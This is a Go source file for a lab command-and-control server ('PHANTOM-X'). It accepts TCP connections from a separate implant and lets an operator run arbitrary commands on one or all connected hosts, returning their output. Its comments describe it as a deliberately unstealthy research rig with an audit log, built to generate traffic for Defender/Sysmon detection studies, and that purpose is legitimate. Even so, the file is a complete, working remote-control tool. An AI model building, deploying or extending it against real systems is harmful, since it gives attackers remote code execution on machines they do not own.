// =============================================================================
// PHANTOM-X :: Phase 5 -- lab C2 server (Go implementation)
// =============================================================================
// c2_server.go -- Operator-side command-and-control server for the PHANTOM-X
// research lab. This is a Go port of c2_server.py.
//
// WHY A GO PORT
//     The lab operator may be running the C2 from a Windows box with no
//     Python interpreter installed. A Go build produces one static .exe with
//     no runtime dependency, cross-compiles to Linux for the Kali-side rig,
//     and keeps the exact same wire protocol so the same C payload works
//     against it unchanged.
//
//     The Python implementation is kept as the reference implementation.
//     validate_c2_equivalence.py cross-checks the two against each other.
//
// DESIGN CONSTRAINTS (deliberate, inherited from the Python reference)
//   * Plain TCP. No encryption, no obfuscation, no domain generation, no
//     traffic shaping. The point of this rig is to produce traffic that can
//     be analysed, and a payload that can be observed by Defender/Sysmon.
//     A stealthy channel would produce nothing worth measuring.
//   * Every session, command, result and disconnect is written to a JSONL
//     audit log. Nothing is done quietly.
//   * No persistence, no credential handling, no lateral movement. Commands
//     run only in the session's own process space on the target.
//
// PROTOCOL (line oriented, UTF-8)
//   client -> server   HELLO|<arch>|<pid>|<hostname>
//                      PONG
//                      RESULT|<cmd_id>|<base64 output>|<exit_code>
//   server -> client   PING
//                      EXEC|<cmd_id>|<command line>
//                      EXIT
//
// BUILD
//     go build -trimpath -ldflags "-s -w" -o px_c2.exe .
//     GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o px_c2 .
//
// USAGE
//     px_c2 --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
//
//     Then from the console:
//         list                     show sessions
//         exec 1 whoami            run a command in session 1
//         exec all ver             run a command in every session
//         ping 1                   measure round trip latency
//         kill 1                   terminate a session cleanly
//         stats                    session / command counts
//         quit                     stop the server
// =============================================================================

package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ---------------------------------------------------------------------------
// constants
// ---------------------------------------------------------------------------

const (
	execTimeout = 30 * time.Second
	pingTimeout = 10 * time.Second
	readBufSize = 64 * 1024
)

// tsFormat matches the Python reference's datetime.isoformat() output so both
// audit logs can be diffed line by line.
const tsFormat = "2006-01-02T15:04:05.000000-07:00"

const banner = `
PHANTOM-X :: LAB C2 SERVER (Go)
  Plain TCP lab rig. Every interaction is written to the audit log.
  Type 'help' for the command list.
`

const helpText = `
  list                 show active sessions
  exec <id|all> <cmd>  run a command in one or all sessions
  ping <id|all>        measure round trip latency
  kill <id|all>        send EXIT (controlled session termination)
  stats                counters and audit log path
  help                 this text
  quit                 stop the server
`

// ---------------------------------------------------------------------------
// audit log
// ---------------------------------------------------------------------------

// AuditLog is the append-only JSONL trail. Every interaction lands here.
type AuditLog struct {
	path  string
	mu    sync.Mutex
	count int
	f     *os.File
}

func newAuditLog(path string) *AuditLog {
	a := &AuditLog{path: path}
	if path == "" {
		return a
	}
	if dir := dirOf(path); dir != "" {
		os.MkdirAll(dir, 0o755)
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] cannot open audit log %s: %v\n", path, err)
		return a
	}
	a.f = f
	return a
}

func (a *AuditLog) write(kind string, fields map[string]any) {
	rec := map[string]any{"ts": nowUTC(), "kind": kind}
	for k, v := range fields {
		rec[k] = v
	}
	line, err := json.Marshal(rec)
	if err != nil {
		return
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	a.count++
	if a.f != nil {
		a.f.Write(append(line, '\n'))
	} else {
		fmt.Println("  [audit] " + string(line))
	}
}

func (a *AuditLog) close() {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.f != nil {
		a.f.Close()
		a.f = nil
	}
}

func (a *AuditLog) records() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.count
}

func nowUTC() string {
	return time.Now().UTC().Format(tsFormat)
}

func dirOf(p string) string {
	i := strings.LastIndexAny(p, `/\`)
	if i <= 0 {
		return ""
	}
	return p[:i]
}

// ---------------------------------------------------------------------------
// session
// ---------------------------------------------------------------------------

// Session is one connected payload.
type Session struct {
	id       int
	conn     net.Conn
	addr     string
	arch     string
	pid      string
	host     string
	connected time.Time
	lastSeen time.Time

	latencyMS  float64
	hasLatency bool

	commandsIssued    int
	commandsCompleted int
	alive             bool

	mu      sync.Mutex
	pending map[string]*pendingCmd

	resultMu sync.Mutex
	results  map[string]storedResult

	sendMu sync.Mutex
}

// storedResult is the decoded outcome of one EXEC, kept so that the console
// can print it after the pending entry has been removed.
type storedResult struct {
	Output    string
	ExitCode  string
	ElapsedMS float64
}

type pendingCmd struct {
	kind string // "exec" or "ping"
	t0   time.Time
	done chan struct{}
}

func newSession(id int, conn net.Conn, addr string) *Session {
	return &Session{
		id:        id,
		conn:      conn,
		addr:      addr,
		arch:      "?",
		pid:       "?",
		host:      "?",
		connected: time.Now().UTC(),
		lastSeen:  time.Now(),
		alive:     true,
		pending:   map[string]*pendingCmd{},
		results:   map[string]storedResult{},
	}
}

func (s *Session) send(text string) bool {
	s.sendMu.Lock()
	defer s.sendMu.Unlock()
	s.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := s.conn.Write([]byte(text + "\r\n"))
	if err != nil {
		s.alive = false
		return false
	}
	return true
}

func (s *Session) close() {
	s.alive = false
	s.conn.Close()
}

func (s *Session) describe() string {
	lat := "n/a"
	if s.hasLatency {
		lat = fmt.Sprintf("%.1fms", s.latencyMS)
	}
	return fmt.Sprintf("[%d] %s arch=%s pid=%s cmd=%d/%d rtt=%s",
		s.id, s.host, s.arch, s.pid, s.commandsCompleted, s.commandsIssued, lat)
}

// ---------------------------------------------------------------------------
// server
// ---------------------------------------------------------------------------

type Server struct {
	host     string
	port     int
	console  bool
	duration time.Duration
	audit    *AuditLog

	sessions   map[int]*Session
	sessionsMu sync.Mutex
	nextID     int
	cmdCounter int

	statsMu sync.Mutex
	stats   map[string]int

	running bool
	runMu   sync.Mutex

	// shutdownOnce makes shutdown() idempotent.
	shutdownOnce sync.Once

	ln net.Listener
}

func newServer(host string, port int, logpath string, console bool, duration time.Duration) *Server {
	return &Server{
		host:     host,
		port:     port,
		console:  console,
		duration: duration,
		audit:    newAuditLog(logpath),
		sessions: map[int]*Session{},
		nextID:   1,
		stats: map[string]int{
			"sessions": 0, "commands": 0, "results": 0, "pings": 0,
		},
		running: true,
	}
}

func (s *Server) isRunning() bool {
	s.runMu.Lock()
	defer s.runMu.Unlock()
	return s.running
}

func (s *Server) stop() {
	s.runMu.Lock()
	s.running = false
	s.runMu.Unlock()
}

func (s *Server) bump(key string) {
	s.statsMu.Lock()
	s.stats[key]++
	s.statsMu.Unlock()
}

func (s *Server) snapshotStats() map[string]int {
	s.statsMu.Lock()
	defer s.statsMu.Unlock()
	out := map[string]int{}
	for k, v := range s.stats {
		out[k] = v
	}
	return out
}

// start binds, listens, and serves until stopped or the duration elapses.
func (s *Server) start() error {
	addr := net.JoinHostPort(s.host, strconv.Itoa(s.port))
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	s.ln = ln

	s.audit.write("server_start", map[string]any{
		"host": s.host, "port": s.port, "log": s.audit.path,
	})
	fmt.Printf("[+] listening on %s\n", ln.Addr())
	if s.audit.path != "" {
		fmt.Printf("[+] audit log: %s\n", s.audit.path)
	}

	if s.console {
		go s.consoleLoop()
	}

	var deadline time.Time
	if s.duration > 0 {
		deadline = time.Now().Add(s.duration)
	}

	for s.isRunning() {
		if !deadline.IsZero() && time.Now().After(deadline) {
			fmt.Println("[+] duration reached, shutting down")
			break
		}
		// Accept() blocks until a connection arrives. Without a deadline
		// it never returns, so the duration check above was never reached
		// and the server could not shut itself down. A short deadline on
		// the listener turns the blocking accept into a poll.
		if tcpLn, ok := ln.(*net.TCPListener); ok {
			tcpLn.SetDeadline(time.Now().Add(500 * time.Millisecond))
		}
		conn, err := ln.Accept()
		if err != nil {
			if !s.isRunning() {
				break
			}
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			break
		}
		s.register(conn)
	}
	return nil
}

// acceptLoop serves an already-bound listener. Used by the integration test
// so it can control the bind step itself.
func (s *Server) acceptLoop(ln net.Listener) {
	s.ln = ln
	s.audit.write("server_start", map[string]any{
		"host": s.host, "port": s.port, "log": s.audit.path,
	})
	for s.isRunning() {
		// Same reasoning as in start(): a blocking Accept() would never
		// return, so the loop could not observe that it should stop.
		if tcpLn, ok := ln.(*net.TCPListener); ok {
			tcpLn.SetDeadline(time.Now().Add(500 * time.Millisecond))
		}
		conn, err := ln.Accept()
		if err != nil {
			if !s.isRunning() {
				break
			}
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			break
		}
		s.register(conn)
	}
}

// register creates a session for an accepted connection and starts its
// read loop.
func (s *Server) register(conn net.Conn) {
	s.sessionsMu.Lock()
	sid := s.nextID
	s.nextID++
	sess := newSession(sid, conn, conn.RemoteAddr().String())
	s.sessions[sid] = sess
	s.sessionsMu.Unlock()

	s.bump("sessions")
	s.audit.write("session_open", map[string]any{
		"session": sid, "peer": sess.addr,
	})
	fmt.Printf("[+] session %d connected from %s\n", sid, sess.addr)
	go s.clientLoop(sess)
}

// waitForSession blocks until a payload connects, or the timeout elapses.
func waitForSession(srv *Server, timeout time.Duration) *Session {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		srv.sessionsMu.Lock()
		var found *Session
		for _, sess := range srv.sessions {
			found = sess
			break
		}
		srv.sessionsMu.Unlock()
		if found != nil {
			return found
		}
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// listenLocal binds a loopback listener on the given port.
func listenLocal(port int) (net.Listener, error) {
	return net.Listen("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(port)))
}

func (s *Server) shutdown() {
	// Idempotent. shutdown() can legitimately be reached twice: once from
	// start() returning and once from an explicit caller. Without this
	// guard the audit log got two "server_stop" records for one shutdown.
	s.shutdownOnce.Do(func() {
		s.stop()

		s.sessionsMu.Lock()
		sessions := make([]*Session, 0, len(s.sessions))
		for _, sess := range s.sessions {
			sessions = append(sessions, sess)
		}
		s.sessionsMu.Unlock()

		for _, sess := range sessions {
			sess.send("EXIT")
			sess.close()
		}
		if s.ln != nil {
			s.ln.Close()
		}
		s.audit.write("server_stop", map[string]any{
			"stats": s.snapshotStats(), "audit_records": s.audit.records(),
		})
		fmt.Printf("\n[+] stopped. audit records: %d\n", s.audit.records())
		s.audit.close()
	})
}

// ---------------------------------------------------------------------------
// client handling
// ---------------------------------------------------------------------------

func (s *Server) clientLoop(sess *Session) {
	defer func() {
		sess.close()
		s.sessionsMu.Lock()
		delete(s.sessions, sess.id)
		s.sessionsMu.Unlock()
		s.audit.write("session_close", map[string]any{
			"session": sess.id, "host": sess.host, "pid": sess.pid,
			"commands_completed": sess.commandsCompleted,
		})
		fmt.Printf("[-] session %d closed (host=%s cmds=%d)\n",
			sess.id, sess.host, sess.commandsCompleted)
	}()

	reader := bufio.NewReaderSize(sess.conn, readBufSize)
	var buf strings.Builder

	for s.isRunning() && sess.alive {
		sess.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		chunk, err := reader.ReadString('\n')
		if chunk != "" {
			buf.WriteString(chunk)
			for {
				raw := buf.String()
				idx := strings.IndexByte(raw, '\n')
				if idx < 0 {
					break
				}
				line := strings.TrimSpace(raw[:idx])
				buf.Reset()
				buf.WriteString(raw[idx+1:])
				if line != "" {
					s.handleLine(sess, line)
				}
			}
		}
		if err != nil {
			break
		}
	}
}

func (s *Server) handleLine(sess *Session, line string) {
	sess.lastSeen = time.Now()
	parts := strings.Split(line, "|")
	kind := parts[0]

	switch kind {
	case "HELLO":
		if len(parts) > 1 {
			sess.arch = parts[1]
		}
		if len(parts) > 2 {
			sess.pid = parts[2]
		}
		if len(parts) > 3 {
			sess.host = parts[3]
		}
		s.audit.write("hello", map[string]any{
			"session": sess.id, "arch": sess.arch,
			"pid": sess.pid, "host": sess.host,
		})
		fmt.Printf("[*] session %d hello: host=%s arch=%s pid=%s\n",
			sess.id, sess.host, sess.arch, sess.pid)

	case "PONG":
		s.bump("pings")
		sess.mu.Lock()
		matched := false
		for _, rec := range sess.pending {
			if rec.kind == "ping" {
				sess.latencyMS = float64(time.Since(rec.t0).Microseconds()) / 1000.0
				sess.hasLatency = true
				close(rec.done)
				matched = true
			}
		}
		lat := sess.latencyMS
		sess.mu.Unlock()

		// A PONG that matches no outstanding PING is still an event worth
		// recording: it means the peer sent traffic the server did not ask
		// for, which is either a desync or something else. The lab's rule
		// is that nothing is done quietly, so this is logged either way.
		if matched {
			s.audit.write("pong", map[string]any{
				"session": sess.id, "latency_ms": round3(lat),
			})
		} else {
			s.audit.write("pong", map[string]any{
				"session": sess.id, "latency_ms": nil, "unmatched": true,
			})
		}

	case "RESULT":
		cmdID := "?"
		if len(parts) > 1 {
			cmdID = parts[1]
		}
		b64 := ""
		if len(parts) > 2 {
			b64 = parts[2]
		}
		rc := "?"
		if len(parts) > 3 {
			rc = parts[3]
		}
		outText := decodeBase64Lenient(b64)
		sess.commandsCompleted++
		s.bump("results")

		sess.mu.Lock()
		rec := sess.pending[cmdID]
		delete(sess.pending, cmdID)
		sess.mu.Unlock()

		// Store the decoded outcome before releasing the waiter, so the
		// exec() goroutine always finds it.
		var elapsedMS float64
		if rec != nil {
			elapsedMS = round3(float64(time.Since(rec.t0).Microseconds()) / 1000.0)
		}
		sess.resultMu.Lock()
		sess.results[cmdID] = storedResult{
			Output: outText, ExitCode: rc, ElapsedMS: elapsedMS,
		}
		sess.resultMu.Unlock()

		var elapsed any
		if rec != nil {
			elapsed = elapsedMS
			close(rec.done)
		}
		s.audit.write("result", map[string]any{
			"session": sess.id, "cmd_id": cmdID, "exit_code": rc,
			"output": outText, "output_len": len(outText),
			"elapsed_ms": elapsed,
		})

	default:
		s.audit.write("unknown_line", map[string]any{
			"session": sess.id, "line": truncate(line, 200),
		})
	}
}

// ---------------------------------------------------------------------------
// dispatch
// ---------------------------------------------------------------------------

type execResult struct {
	Output    string
	ExitCode  string
	ElapsedMS float64
	HasTiming bool
}

func (s *Server) exec(sess *Session, command string, timeout time.Duration) *execResult {
	s.sessionsMu.Lock()
	s.cmdCounter++
	cmdID := strconv.Itoa(s.cmdCounter)
	s.sessionsMu.Unlock()

	sess.commandsIssued++
	s.bump("commands")

	done := make(chan struct{})
	sess.mu.Lock()
	sess.pending[cmdID] = &pendingCmd{kind: "exec", t0: time.Now(), done: done}
	sess.mu.Unlock()

	s.audit.write("exec", map[string]any{
		"session": sess.id, "cmd_id": cmdID, "command": command,
	})
	if !sess.send("EXEC|" + cmdID + "|" + command) {
		return nil
	}

	select {
	case <-done:
	case <-time.After(timeout):
		sess.mu.Lock()
		delete(sess.pending, cmdID)
		sess.mu.Unlock()
		return nil
	}

	sess.resultMu.Lock()
	res, ok := sess.results[cmdID]
	sess.resultMu.Unlock()
	if !ok {
		return nil
	}
	return &execResult{
		Output:    res.Output,
		ExitCode:  res.ExitCode,
		ElapsedMS: s.lastElapsed(sess, cmdID),
		HasTiming: true,
	}
}

// lastElapsed returns the measured duration of one command, if it was
// recorded when the RESULT arrived.
func (s *Server) lastElapsed(sess *Session, cmdID string) float64 {
	sess.resultMu.Lock()
	defer sess.resultMu.Unlock()
	if r, ok := sess.results[cmdID]; ok {
		return r.ElapsedMS
	}
	return 0
}

// lastOutput / lastExit pull the values recorded by handleLine's RESULT
// branch. They are stored on the session to keep the pending map small.
func (s *Server) lastOutput(sess *Session, cmdID string) string {
	sess.resultMu.Lock()
	defer sess.resultMu.Unlock()
	if r, ok := sess.results[cmdID]; ok {
		return r.Output
	}
	return ""
}

func (s *Server) lastExit(sess *Session, cmdID string) string {
	sess.resultMu.Lock()
	defer sess.resultMu.Unlock()
	if r, ok := sess.results[cmdID]; ok {
		return r.ExitCode
	}
	return ""
}

func (s *Server) measureLatency(sess *Session, timeout time.Duration) (float64, bool) {
	s.sessionsMu.Lock()
	s.cmdCounter++
	cmdID := strconv.Itoa(s.cmdCounter)
	s.sessionsMu.Unlock()

	done := make(chan struct{})
	sess.mu.Lock()
	sess.pending[cmdID] = &pendingCmd{kind: "ping", t0: time.Now(), done: done}
	sess.mu.Unlock()

	sess.send("PING")
	select {
	case <-done:
	case <-time.After(timeout):
		sess.mu.Lock()
		delete(sess.pending, cmdID)
		sess.mu.Unlock()
		return 0, false
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	return sess.latencyMS, sess.hasLatency
}

// ---------------------------------------------------------------------------
// console
// ---------------------------------------------------------------------------

func (s *Server) consoleLoop() {
	time.Sleep(300 * time.Millisecond)
	reader := bufio.NewReader(os.Stdin)
	for s.isRunning() {
		fmt.Print("c2> ")
		line, err := reader.ReadString('\n')
		if err != nil && line == "" {
			return
		}
		line = strings.TrimSpace(line)
		if line != "" {
			s.consoleCmd(line)
		}
		if err != nil {
			return
		}
	}
}

func (s *Server) consoleCmd(line string) {
	switch {
	case line == "quit" || line == "exit":
		s.stop()
	case line == "help" || line == "?":
		fmt.Print(helpText)
	case line == "list" || line == "ls":
		s.sessionsMu.Lock()
		sessions := make([]*Session, 0, len(s.sessions))
		for _, sess := range s.sessions {
			sessions = append(sessions, sess)
		}
		s.sessionsMu.Unlock()
		if len(sessions) == 0 {
			fmt.Println("  (no sessions)")
		}
		for _, sess := range sessions {
			fmt.Println("  " + sess.describe())
		}
	case line == "stats":
		b, _ := json.Marshal(s.snapshotStats())
		fmt.Println("  " + string(b))
		fmt.Printf("  audit records: %d -> %s\n", s.audit.records(), s.audit.path)
	case strings.HasPrefix(line, "ping"):
		arg := argOf(line, "all")
		for _, sess := range s.targets(arg) {
			lat, ok := s.measureLatency(sess, pingTimeout)
			if ok {
				fmt.Printf("  session %d: rtt=%.1fms\n", sess.id, lat)
			} else {
				fmt.Printf("  session %d: no PONG\n", sess.id)
			}
		}
	case strings.HasPrefix(line, "exec"):
		rest := strings.TrimSpace(line[len("exec"):])
		fields := strings.SplitN(rest, " ", 2)
		if len(fields) < 2 || strings.TrimSpace(fields[1]) == "" {
			fmt.Println("  usage: exec <session|all> <command>")
			return
		}
		target, command := fields[0], strings.TrimSpace(fields[1])
		for _, sess := range s.targets(target) {
			fmt.Printf("  -> session %d: %s\n", sess.id, command)
			res := s.exec(sess, command, execTimeout)
			if res == nil {
				fmt.Printf("  <- session %d: TIMEOUT (no result within %s)\n",
					sess.id, execTimeout)
				continue
			}
			fmt.Printf("  <- session %d: exit=%s (%.1fms)\n",
				sess.id, res.ExitCode, res.ElapsedMS)
			if res.Output != "" {
				for _, ol := range strings.Split(strings.TrimRight(res.Output, "\r\n"), "\n") {
					fmt.Println("       " + ol)
				}
			} else {
				fmt.Println("       (no output)")
			}
		}
	case strings.HasPrefix(line, "kill"):
		arg := argOf(line, "all")
		for _, sess := range s.targets(arg) {
			s.audit.write("terminate_requested", map[string]any{"session": sess.id})
			sess.send("EXIT")
			fmt.Printf("  session %d: EXIT sent\n", sess.id)
		}
	default:
		fmt.Println("  unknown command; type 'help'")
	}
}

func (s *Server) targets(arg string) []*Session {
	s.sessionsMu.Lock()
	defer s.sessionsMu.Unlock()
	sessions := make([]*Session, 0, len(s.sessions))
	for _, sess := range s.sessions {
		sessions = append(sessions, sess)
	}
	if arg == "all" || arg == "*" {
		return sessions
	}
	sid, err := strconv.Atoi(arg)
	if err != nil {
		return nil
	}
	out := []*Session{}
	for _, sess := range sessions {
		if sess.id == sid {
			out = append(out, sess)
		}
	}
	return out
}

func argOf(line, fallback string) string {
	fields := strings.Fields(line)
	if len(fields) > 1 {
		return fields[1]
	}
	return fallback
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

// decodeBase64Lenient mirrors Python's base64.b64decode(b64 + "==="), which
// tolerates missing padding and ignores invalid characters.
func decodeBase64Lenient(s string) string {
	if s == "" {
		return ""
	}
	cleaned := strings.Map(func(r rune) rune {
		if r == '=' {
			return -1
		}
		return r
	}, s)
	for len(cleaned)%4 != 0 {
		cleaned += "="
	}
	data, err := base64.StdEncoding.DecodeString(cleaned)
	if err != nil {
		return "<undecodable payload>"
	}
	return strings.ToValidUTF8(string(data), "")
}

func round3(f float64) float64 {
	return float64(int64(f*1000+0.5)) / 1000
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	host := flag.String("host", "0.0.0.0", "bind address")
	port := flag.Int("port", 9001, "bind port")
	logpath := flag.String("log", "c2_audit.jsonl", "audit log path")
	noConsole := flag.Bool("no-console", false, "run headless (for scripted / automated runs)")
	duration := flag.Int("duration", 0, "stop automatically after N seconds (0 = run forever)")
	flag.Parse()

	fmt.Print(banner)

	srv := newServer(*host, *port, *logpath, !*noConsole, time.Duration(*duration)*time.Second)

	// Ctrl+C shuts the server down cleanly so the audit log is flushed and
	// the payload gets an EXIT rather than a dropped socket.
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigc
		fmt.Println("\n[!] interrupted")
		srv.stop()
	}()

	if err := srv.start(); err != nil {
		fmt.Fprintf(os.Stderr, "[!] cannot bind %s:%d: %v\n", *host, *port, err)
		os.Exit(2)
	}
	srv.shutdown()
}
